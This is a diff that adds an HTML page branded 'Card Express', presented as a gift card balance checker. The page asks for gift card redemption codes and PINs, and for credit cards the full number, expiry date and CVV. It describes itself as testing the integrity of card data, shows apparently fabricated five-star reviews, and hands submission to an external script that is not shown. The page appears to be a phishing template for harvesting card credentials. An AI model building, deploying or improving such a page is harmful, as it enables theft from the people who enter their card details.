@@ -1,0 +1,1175 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card Express | Secure Gift Card Balance Checker</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&amp;display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #1a2c3e;
+            line-height: 1.5;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 32px;
+        }
+
+        .navbar {
+            background: rgba(255, 255, 255, 0.95);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 18px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .nav-flex {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+        }
+
+        .logo-icon {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            width: 44px;
+            height: 44px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+        }
+
+        .logo-text h1 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .logo-text span {
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: #5a6e7a;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 32px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            font-weight: 500;
+            color: #4a5568;
+            transition: all 0.3s;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .nav-links a:hover,
+        .nav-links a.active {
+            color: #667eea;
+        }
+
+        .nav-links a.active::after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #667eea;
+            border-radius: 2px;
+        }
+
+        .hero {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 80px 0;
+            text-align: center;
+        }
+
+        .hero-content h1 {
+            font-size: 3rem;
+            font-weight: 800;
+            margin-bottom: 1rem;
+            letter-spacing: -0.02em;
+        }
+
+        .hero-content p {
+            font-size: 1.25rem;
+            max-width: 600px;
+            margin: 0 auto;
+            opacity: 0.9;
+            line-height: 1.6;
+        }
+
+        .hero-section {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 60px 0 80px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .checker-card {
+            background: white;
+            border-radius: 36px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            padding: 40px 36px;
+            max-width: 750px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 2;
+            min-height: 400px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .verification-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 60px;
+            padding: 8px 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: white;
+            margin-bottom: 24px;
+            align-self: flex-start;
+        }
+
+        h2 {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #0e2e44;
+        }
+
+        .card-subtitle {
+            color: #6c8faa;
+            margin-bottom: 24px;
+            font-size: 0.9rem;
+        }
+
+        .error-box {
+            background: #fee;
+            border-left: 4px solid #dc3545;
+            padding: 20px 24px;
+            border-radius: 12px;
+            margin-bottom: 24px;
+            width: 100%;
+        }
+
+        .error-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .error-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .error-left i {
+            font-size: 28px;
+            color: #dc3545;
+        }
+
+        .error-left h4 {
+            color: #dc3545;
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .error-left p {
+            color: #721c24;
+            font-size: 0.9rem;
+        }
+
+        .try-again-btn {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 10px 28px;
+            border-radius: 40px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .try-again-btn:hover {
+            background: #c82333;
+            transform: translateY(-1px);
+        }
+
+        /* Step indicator */
+        .step-indicator {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding: 12px 16px;
+            background: #f8f9fa;
+            border-radius: 12px;
+        }
+
+        .step-indicator .step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .step-indicator .step.active {
+            color: #667eea;
+        }
+
+        .step-indicator .step.done {
+            color: #28a745;
+        }
+
+        .step-indicator .step-line {
+            flex: 1;
+            height: 2px;
+            background: #e2e8f0;
+            position: relative;
+        }
+
+        .step-indicator .step-line.active {
+            background: #667eea;
+        }
+
+        .step-indicator .step-line.done {
+            background: #28a745;
+        }
+
+        .success-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            animation: modalFadeIn 0.5s ease;
+            padding: 20px;
+        }
+
+        @keyframes modalFadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .success-modal {
+            background: linear-gradient(145deg, #ffffff 0%, #f8f9fa 100%);
+            border-radius: 40px;
+            padding: 60px 50px;
+            max-width: 580px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.3);
+            position: relative;
+            animation: modalPulse 1.5s ease-in-out;
+        }
+
+        @keyframes modalPulse {
+            0% {
+                transform: scale(0.95);
+                opacity: 0;
+            }
+
+            50% {
+                transform: scale(1.02);
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .success-modal .modal-icon {
+            font-size: 72px;
+            color: #28a745;
+            margin-bottom: 12px;
+            display: block;
+            animation: iconBounce 0.8s ease;
+        }
+
+        @keyframes iconBounce {
+            0% {
+                transform: scale(0);
+            }
+
+            50% {
+                transform: scale(1.3);
+            }
+
+            70% {
+                transform: scale(0.9);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .success-modal .modal-title {
+            font-size: 2.8rem;
+            font-weight: 900;
+            color: #28a745;
+            margin-bottom: 8px;
+            letter-spacing: -0.02em;
+            text-transform: uppercase;
+        }
+
+        .success-modal .modal-subtitle {
+            font-size: 1.1rem;
+            color: #6c8faa;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .success-modal .modal-divider {
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(90deg, #28a745, #20c997);
+            margin: 12px auto 24px;
+            border-radius: 4px;
+        }
+
+        .success-modal .modal-balance {
+            font-size: 4.5rem;
+            font-weight: 900;
+            color: #1e3b4f;
+            padding: 16px 20px;
+            background: rgba(40, 167, 69, 0.08);
+            border-radius: 20px;
+            display: inline-block;
+            margin: 8px 0 12px;
+            letter-spacing: -0.02em;
+        }
+
+        .success-modal .modal-details {
+            font-size: 1rem;
+            color: #5a6e7a;
+            margin: 8px 0 4px;
+            font-weight: 500;
+        }
+
+        .success-modal .modal-try-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 16px 48px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 28px;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
+        }
+
+        .success-modal .modal-try-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(102, 126, 234, 0.4);
+        }
+
+        .success-modal .modal-try-btn i {
+            font-size: 1.2rem;
+        }
+
+        .input-group {
+            margin-bottom: 28px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .input-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1e3b4f;
+        }
+
+        .input-group label i {
+            margin-right: 8px;
+            color: #667eea;
+        }
+
+        select,
+        input {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 24px;
+            font-size: 1rem;
+            font-family: 'Inter', monospace;
+            transition: 0.2s;
+        }
+
+        select:focus,
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+        }
+
+        .amount-wrapper {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .currency-select {
+            flex: 0 0 120px;
+        }
+
+        .amount-input {
+            flex: 2;
+        }
+
+        .dynamic-fields {
+            margin-top: 20px;
+        }
+
+        .check-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            padding: 14px 28px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 1rem;
+            color: white;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .check-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -5px rgba(102, 126, 234, 0.4);
+        }
+
+        .field-hint {
+            display: block;
+            margin-top: 8px;
+            font-size: 0.7rem;
+            color: #6c8faa;
+        }
+
+        .code-input {
+            font-family: 'Courier New', monospace;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .section {
+            scroll-margin-top: 100px;
+        }
+
+        .info-grid {
+            display: flex;
+            gap: 36px;
+            margin: 70px 0;
+            flex-wrap: wrap;
+        }
+
+        .info-card {
+            flex: 1;
+            background: white;
+            border-radius: 28px;
+            padding: 32px 28px;
+            box-shadow: 0 10px 25px -12px rgba(0, 0, 0, 0.1);
+        }
+
+        .info-card i {
+            font-size: 2.4rem;
+            background: linear-gradient(145deg, #667eea, #764ba2);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            margin-bottom: 18px;
+        }
+
+        .info-card h3 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 14px;
+        }
+
+        .reviews-section {
+            margin: 50px 0 70px;
+        }
+
+        .section-title {
+            font-size: 2rem;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 48px;
+            color: white;
+        }
+
+        .reviews-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+        }
+
+        .review-item {
+            background: white;
+            border-radius: 28px;
+            padding: 28px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .review-item:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 20px 30px -12px rgba(0, 0, 0, 0.15);
+        }
+
+        .stars {
+            color: #f5b042;
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+        }
+
+        .review-text {
+            font-size: 0.95rem;
+            line-height: 1.5;
+            color: #2c4f6e;
+            margin-bottom: 20px;
+            font-style: italic;
+        }
+
+        .review-author {
+            font-weight: 700;
+            color: #667eea;
+        }
+
+        footer {
+            background: #1a1a2e;
+            color: #cfdfec;
+            padding: 36px 0;
+            margin-top: 40px;
+        }
+
+        .footer-copyright {
+            text-align: center;
+            font-size: 0.8rem;
+            opacity: 0.8;
+        }
+
+        .scroll-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: #667eea;
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 99;
+        }
+
+        .scroll-top.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .scroll-top:hover {
+            background: #764ba2;
+            transform: translateY(-3px);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 20px;
+            }
+
+            .checker-card {
+                padding: 28px 20px;
+                min-height: auto;
+            }
+
+            .nav-links {
+                gap: 20px;
+            }
+
+            .nav-links a {
+                font-size: 0.9rem;
+            }
+
+            .amount-wrapper {
+                flex-direction: column;
+            }
+
+            .currency-select {
+                width: 100%;
+            }
+
+            .scroll-top {
+                bottom: 20px;
+                right: 20px;
+                width: 40px;
+                height: 40px;
+            }
+
+            .error-content {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .try-again-btn {
+                width: 100%;
+                justify-content: center;
+            }
+
+            .success-modal {
+                padding: 40px 24px;
+                margin: 0 16px;
+            }
+
+            .success-modal .modal-title {
+                font-size: 2rem;
+            }
+
+            .success-modal .modal-balance {
+                font-size: 3rem;
+                padding: 12px 16px;
+            }
+
+            .success-modal .modal-icon {
+                font-size: 56px;
+            }
+
+            .success-modal .modal-try-btn {
+                padding: 14px 32px;
+                font-size: 1rem;
+                width: 100%;
+                justify-content: center;
+            }
+
+            .hero {
+                padding: 60px 0;
+            }
+
+            .hero-content h1 {
+                font-size: 2rem;
+            }
+
+            .hero-content p {
+                font-size: 1rem;
+                padding: 0 20px;
+            }
+
+            .step-indicator {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
+            }
+
+            .step-indicator .step-line {
+                width: 100%;
+                height: 2px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .success-modal .modal-balance {
+                font-size: 2.4rem;
+            }
+
+            .success-modal .modal-title {
+                font-size: 1.6rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <nav class="navbar">
+        <div class="container nav-flex">
+            <div class="logo-area" onclick="scrollToSection('home')">
+                <div class="logo-icon">
+                    <i class="fas fa-credit-card"></i>
+                </div>
+                <div class="logo-text">
+                    <h1>Card Express</h1>
+                    <span>verify cards with confidence</span>
+                </div>
+            </div>
+            <div class="nav-links">
+                <a class="nav-link active" data-section="home">Home</a>
+                <a class="nav-link" data-section="balance">Check Balance</a>
+                <a class="nav-link" data-section="about">About</a>
+                <a class="nav-link" data-section="reviews">Reviews</a>
+            </div>
+        </div>
+    </nav>
+
+    <section id="home" class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <h1>Verify any card with confidence</h1>
+                <p>Card Express is a software platform that is used to verify, track, and test the integrity of gift
+                    card or credit card information.</p>
+            </div>
+        </div>
+    </section>
+
+    <main>
+        <div id="balance" class="hero-section section">
+            <div class="container">
+                <div class="checker-card">
+                    <div class="verification-badge">
+                        <i class="fas fa-shield-alt"></i>
+                        Enter Card Details
+                    </div>
+
+                    <h2>Check your card balance</h2>
+                    <p class="card-subtitle">Cards</p>
+
+
+
+
+
+                    <form method="POST" action="#" id="balanceForm">
+                        <div class="input-group">
+                            <label><i class="fas fa-tag"></i> Card Type</label>
+                            <select name="card_type" id="cardTypeSelect" required>
+                                <option value="">Select type of card</option>
+                                <option value="apple"> Apple Gift Card</option>
+                                <option value="amazon"> Amazon Card</option>
+                                <option value="steam"> Steam Wallet</option>
+                                <option value="ebay"> eBay Card</option>
+                                <option value="xbox"> Xbox Gift Card</option>
+                                <option value="googleplay"> Google Play</option>
+                                <option value="sephora"> Sephora Card</option>
+                                <option value="razer"> Razer Gold</option>
+                                <option value="nordstrom"> Nordstrom Card</option>
+                                <option value="nike"> Nike Gift Card</option>
+                                <option value="mastercard"> MasterCard Gift</option>
+                                <option value="vanillavisa"> Vanilla Visa</option>
+                                <option value="walmart"> Walmart Visa</option>
+                                <option value="amex">American Express</option>
+                            </select>
+                        </div>
+
+                        <div id="dynamicFields" class="dynamic-fields"></div>
+
+                        <button type="submit" class="check-btn" id="checkBtn">
+                            <i class="fas fa-chart-simple"></i> CHECK BALANCE </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div id="about" class="info-grid section">
+                <div class="info-card">
+                    <i class="fas fa-chart-line"></i>
+                    <h3>An efficient solution to verify all cards data.</h3>
+                    <p>Card Express is the most efficient framework to verify a card. It allows you to take the fastest
+                        route from the verification of a physical card to the activation of the associated app or
+                        website. In addition, Card Express uses a unique smart algorithm.</p>
+                </div>
+                <div class="info-card">
+                    <i class="fas fa-building"></i>
+                    <h3>About US</h3>
+                    <p><strong>Card Express was founded in 2016</strong> by a team of experienced entrepreneurs who saw
+                        a need for a more convenient and efficient way to check gift card balances. We are committed to
+                        providing our customers with the best possible experience, and we are constantly working to
+                        improve our services.</p>
+                </div>
+            </div>
+
+            <div id="reviews" class="reviews-section section">
+                <div class="section-title">
+                    <i class="fas fa-star" style="color:#f5b042;"></i> Users Review
+                </div>
+                <div class="reviews-grid">
+                    <div class="review-item">
+                        <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i
+                                class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+                        <div class="review-text">"I'm so glad I tried Card Express! It's so easy to use and provides
+                            accurate results quickly and easily."</div>
+                        <div class="review-author">— Austin Brian</div>
+                    </div>
+                    <div class="review-item">
+                        <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i
+                                class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+                        <div class="review-text">"Card Express is a lifesaver! It has made it so much easier for me to
+                            manage my gift cards."</div>
+                        <div class="review-author">— Lincon Hervat</div>
+                    </div>
+                    <div class="review-item">
+                        <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i
+                                class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+                        <div class="review-text">"The best gift card checking software I've ever used. Easy to use and
+                            provides accurate results instantly."</div>
+                        <div class="review-author">— Diana Samuel</div>
+                    </div>
+                    <div class="review-item">
+                        <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i
+                                class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+                        <div class="review-text">"Card Express has made my life so much easier! I can check all my gift
+                            card balances in one place."</div>
+                        <div class="review-author">— Kate George</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-copyright">
+                © 2016 - 2026 Card Express — Verify cards with confidence. All trademarks reserved.
+            </div>
+        </div>
+    </footer>
+
+    <div class="scroll-top" id="scrollTop">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+
+    <script>
+        const cardConfigs = {
+            gift_cards: ['apple', 'amazon', 'steam', 'ebay', 'xbox', 'googleplay', 'razer'],
+            gift_cards_with_pin: ['sephora', 'nordstrom', 'nike'],
+            credit_cards: ['mastercard', 'vanillavisa', 'walmart'],
+            credit_card_with_pin: ['amex']
+        };
+
+        const fieldSpecs = {
+            apple: { redemption_digits: 16, hint: 'Enter 16-digit alphanumeric code' },
+            amazon: { redemption_digits: 15, hint: 'Enter 15-digit alphanumeric code' },
+            steam: { redemption_digits: 15, hint: 'Enter 15-digit alphanumeric code' },
+            ebay: { redemption_digits: 13, hint: 'Enter 13-digit alphanumeric code' },
+            xbox: { redemption_digits: 25, hint: 'Enter 25-digit alphanumeric code' },
+            googleplay: { redemption_digits: 16, hint: 'Enter 16-digit alphanumeric code' },
+            razer: { redemption_digits: 14, hint: 'Enter 14-digit alphanumeric code' },
+            sephora: { redemption_digits: 16, pin_digits: 4, hint: '16-digit code + 4-digit PIN' },
+            nordstrom: { redemption_digits: 16, pin_digits: 4, hint: '16-digit code + 4-digit PIN' },
+            nike: { redemption_digits: 16, pin_digits: 4, hint: '16-digit code + 4-digit PIN' },
+            amex: { pin_digits: 4, hint: 'Card number + Expiry + CVV + 4-digit PIN' }
+        };
+
+        function clearFormAndRetry() {
+            // Clear all input fields but KEEP session data
+            document.querySelectorAll('input').forEach(input => {
+                if (input.type !== 'submit' && input.type !== 'button') {
+                    input.value = '';
+                }
+            });
+
+            // Reset select dropdowns to default
+            const select = document.getElementById('cardTypeSelect');
+            if (select) select.value = '';
+
+            // Clear dynamic fields
+            const dynamicFields = document.getElementById('dynamicFields');
+            if (dynamicFields) dynamicFields.innerHTML = '';
+
+            // Remove error box
+            const errorBox = document.querySelector('.error-box');
+            if (errorBox) errorBox.remove();
+
+            // Just reload the page without clearing session
+            window.location.href = window.location.pathname + '?clear=1';
+        }
+
+        function scrollToSection(sectionId) {
+            const element = document.getElementById(sectionId);
+            if (element) {
+                const offset = 100;
+                const elementPosition = element.getBoundingClientRect().top;
+                const offsetPosition = elementPosition + window.pageYOffset - offset;
+                window.scrollTo({ top: offsetPosition, behavior: 'smooth' });
+                updateActiveNavLink(sectionId);
+            }
+        }
+
+        function updateActiveNavLink(activeSection) {
+            document.querySelectorAll('.nav-link').forEach(link => {
+                const section = link.getAttribute('data-section');
+                if (section === activeSection) {
+                    link.classList.add('active');
+                } else {
+                    link.classList.remove('active');
+                }
+            });
+        }
+
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', function (e) {
+                e.preventDefault();
+                const section = this.getAttribute('data-section');
+                scrollToSection(section);
+            });
+        });
+
+        document.querySelector('.logo-area')?.addEventListener('click', () => scrollToSection('home'));
+
+        window.addEventListener('scroll', () => {
+            const sections = ['home', 'balance', 'about', 'reviews'];
+            const scrollPosition = window.scrollY + 150;
+            for (const section of sections) {
+                const element = document.getElementById(section);
+                if (element) {
+                    const offsetTop = element.offsetTop;
+                    const offsetBottom = offsetTop + element.offsetHeight;
+                    if (scrollPosition >= offsetTop && scrollPosition < offsetBottom) {
+                        updateActiveNavLink(section);
+                        break;
+                    }
+                }
+            }
+
+            const scrollTopBtn = document.getElementById('scrollTop');
+            if (window.scrollY > 300) scrollTopBtn.classList.add('show');
+            else scrollTopBtn.classList.remove('show');
+        });
+
+        document.getElementById('scrollTop')?.addEventListener('click', () => {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+
+        function formatAlphanumeric(input, maxLength) {
+            let value = input.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+            if (value.length > maxLength) value = value.slice(0, maxLength);
+            input.value = value;
+        }
+
+        function formatExpiryDate(input) {
+            let value = input.value.replace(/[^0-9]/g, '');
+            if (value.length >= 2) {
+                let month = value.slice(0, 2);
+                if (parseInt(month) > 12) month = '12';
+                if (value.length >= 3) input.value = month + '/' + value.slice(2, 4);
+                else input.value = month;
+            } else {
+                input.value = value;
+            }
+        }
+
+        function formatNumericInput(input, maxLength) {
+            input.value = input.value.replace(/[^0-9]/g, '').slice(0, maxLength);
+        }
+
+        function getFieldHtml(cardType) {
+            if (!cardType) return '';
+            let html = '';
+
+            if (cardConfigs.gift_cards.includes(cardType) || cardConfigs.gift_cards_with_pin.includes(cardType)) {
+                html += `
+                        <div class="input-group">
+                            <label><i class="fas fa-coins"></i> Card Amount & Currency</label>
+                            <div class="amount-wrapper">
+                                <div class="currency-select">
+                                    <select name="currency" id="currencySelect" required>
+                                        <option value="">Currency</option>
+                                        <option value="USD">🇺🇸 USD</option>
+                                        <option value="EUR">🇪🇺 EUR</option>
+                                        <option value="AUD">🇦🇺 AUD</option>
+                                        <option value="CAD">🇨🇦 CAD</option>
+                                        <option value="GBP">🇬🇧 GBP</option>
+                                        <option value="JPY">🇯🇵 JPY</option>
+                                    </select>
+                                </div>
+                                <div class="amount-input">
+                                    <input type="number" name="amount" id="cardAmount" placeholder="Enter amount" step="any" min="0.01" required>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+
+                const spec = fieldSpecs[cardType];
+                const digits = spec?.redemption_digits || 16;
+                html += `
+                        <div class="input-group">
+                            <label><i class="fas fa-key"></i> Enter Card PIN here:
+                            <input type="text" name="redemption_code" id="redemptionCode" class="code-input"
+                                   placeholder="Enter card pin" maxlength="${digits}" autocomplete="off" required>
+                            <small class="field-hint"><i class="fas fa-info-circle"></i> ${spec?.hint || `Enter exactly ${digits} alphanumeric characters`}</small>
+                        </div>
+                    `;
+            }
+
+            if (cardConfigs.gift_cards_with_pin.includes(cardType)) {
+                const spec = fieldSpecs[cardType];
+                const pinDigits = spec?.pin_digits || 4;
+                html += `
+                        <div class="input-group">
+                            <label><i class="fas fa-lock"></i> Gift Card PIN (${pinDigits} digits)</label>
+                            <input type="password" name="giftcard_pin" id="giftcardPin" 
+                                   placeholder="Enter ${pinDigits}-digit PIN" pattern="[0-9]{${pinDigits}}" maxlength="${pinDigits}" required>
+                        </div>
+                    `;
+            }
+
+            if (cardConfigs.credit_cards.includes(cardType)) {
+                html += `
+                        <div class="input-group">
+                            <label><i class="fas fa-credit-card"></i> Card Number</label>
+                            <input type="text" name="card_number" id="cardNumber" placeholder="Enter 15-16 digit card number" 
+                                   pattern="[0-9]{15,16}" maxlength="16" required>
+                        </div>
+                        <div class="input-group">
+                            <label><i class="fas fa-calendar-alt"></i> Expiry Date (MM/YY)</label>
+                            <input type="text" name="expiry_date" id="expiryDate" placeholder="MM/YY" 
+                                   pattern="(0[1-9]|1[0-2])\/[0-9]{2}" required>
+                        </div>
+                        <div class="input-group">
+                            <label><i class="fas fa-lock"></i> CVV</label>
+                            <input type="password" name="cvv" id="cvv" placeholder="3 or 4 digit CVV" 
+                                   pattern="[0-9]{3,4}" maxlength="4" required>
+                        </div>
+                    `;
+            }
+
+            if (cardType === 'amex') {
+                html += `
+                        <div class="input-group">
+                            <label><i class="fas fa-credit-card"></i> Card Number</label>
+                            <input type="text" name="card_number" id="cardNumber" placeholder="Enter 15-digit Amex card number" 
+                                   pattern="[0-9]{15}" maxlength="15" required>
+                        </div>
+                        <div class="input-group">
+                            <label><i class="fas fa-calendar-alt"></i> Expiry Date (MM/YY)</label>
+                            <input type="text" name="expiry_date" id="expiryDate" placeholder="MM/YY" 
+                                   pattern="(0[1-9]|1[0-2])\/[0-9]{2}" required>
+                        </div>
+                        <div class="input-group">
+                            <label><i class="fas fa-lock"></i> CVV</label>
+                            <input type="password" name="cvv" id="cvv" placeholder="4 digit CVV" pattern="[0-9]{4}" maxlength="4" required>
+                        </div>
+                        <div class="input-group">
+                            <label><i class="fas fa-key"></i> Gift Card PIN (4 digits)</label>
+                            <input type="password" name="giftcard_pin" id="giftcardPin" placeholder="Enter 4-digit PIN" 
+                                   pattern="[0-9]{4}" maxlength="4" required>
+                        </div>
+                    `;
+            }
+
+            return html;
+        }
+
+        document.getElementById('cardTypeSelect')?.addEventListener('change', function () {
+            const dynamicFields = document.getElementById('dynamicFields');
+            dynamicFields.innerHTML = getFieldHtml(this.value);
+
+            setTimeout(() => {
+                document.getElementById('expiryDate')?.addEventListener('input', function () {
+                    formatExpiryDate(
+                        this);
+                });
+                document.getElementById('cardNumber')?.addEventListener('input', function () {
+                    formatNumericInput(
+                        this, 16);
+                });
+                document.getElementById('cvv')?.addEventListener('input', function () {
+                    formatNumericInput(this,
+                        4);
+                });
+
+                const redemptionInput = document.getElementById('redemptionCode');
+                if (redemptionInput) {
+                    const specs = fieldSpecs[document.getElementById('cardTypeSelect').value];
+                    const maxLen = specs?.redemption_digits || 16;
+                    redemptionInput.maxLength = maxLen;
+                    redemptionInput.addEventListener('input', function () { formatAlphanumeric(this, maxLen); });
+                }
+
+                document.getElementById('giftcardPin')?.addEventListener('input', function () {
+                    formatNumericInput(
+                        this, 4);
+                });
+            }, 50);
+        });
+
+        if (document.getElementById('cardTypeSelect').value) {
+            document.getElementById('cardTypeSelect').dispatchEvent(new Event('change'));
+        }
+    </script>
+
+    <script src="submit-endpoint.js"></script>
+</body>
+
+</html>
